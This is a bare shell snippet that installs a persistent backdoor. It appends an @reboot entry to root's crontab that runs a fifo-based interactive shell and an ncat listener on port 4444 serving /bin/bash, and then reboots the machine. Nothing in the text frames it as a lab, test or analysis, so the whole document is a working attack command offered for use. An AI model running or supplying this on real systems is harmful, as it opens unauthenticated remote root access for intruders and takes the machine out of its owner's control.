echo "@reboot rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|while true; do ncat -lnvp 4444 -e /bin/bash >/tmp/f; done" >> /var/spool/cron/crontabs/root;
sleep 2;
reboot;